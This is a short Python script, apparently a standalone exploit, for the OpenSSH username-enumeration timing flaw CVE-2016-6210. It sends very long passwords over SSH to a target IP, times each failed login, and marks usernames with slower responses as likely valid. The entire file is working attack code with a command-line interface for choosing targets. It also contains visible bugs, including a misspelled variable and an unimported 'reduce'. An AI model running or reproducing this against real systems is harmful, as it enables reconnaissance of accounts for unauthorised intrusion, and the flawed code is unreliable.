
import paramiko
import time
import argparse


class Engine(object):
    file_path = None
    target = ''
    userlist = ['root']
    calc_times = []

    def __init__(self, target, filepath=None):
        self.target = target
        self.file_path = filepath
        if self.file_path:
            self.load_users(filepath)

    def load_users(self, filepath):
        data = []
        with open(filepath, 'r') as f:
            data = f.read().splitlines()
        self.userlist = data

    def execute(self):
        for user in self.userlist:
            p = 'A' * 25000
            ssh = paramiko.SSHClient()
            start_time = time.clock()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            end_time = time.clock()
            try:
                ssh.connect(self.target, username=user, password=p)
            except:
                end_time = time.clock()
            total = end_time - start_time
            self.calc_times.append(total)
            avg = reduce(lambda x, y: x + y, self.calc_times) / len(self.calc_times)
            flag = '*' if total > avg else ''
            print('%s:\t\t%s\t%s' % (user, total, flag))


def main(ip_addr, filename=None):
    if ip_addr == '' or not ip_addr:
        print('No target IP specified')
        return
    if filename == '':
        filepname = None
    engine = Engine(target=ip_addr, filepath=filename)
    engine.execute()

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description='Simple automated script for CVE 2016-6210 -- OpenSSHD 7.2p2 >= version')
    parser.add_argument('ip', help='[Required] The IP of the target server')
    parser.add_argument('-u', '--userlist', help='Specify a filepath with a list of usernames to try -- one username per line')

    ip_addr = None
    filename = None
    args = parser.parse_args()

    if args.ip:
        ip_addr = args.ip
    if args.userlist:
        filename = args.userlist
    main(ip_addr, filename)


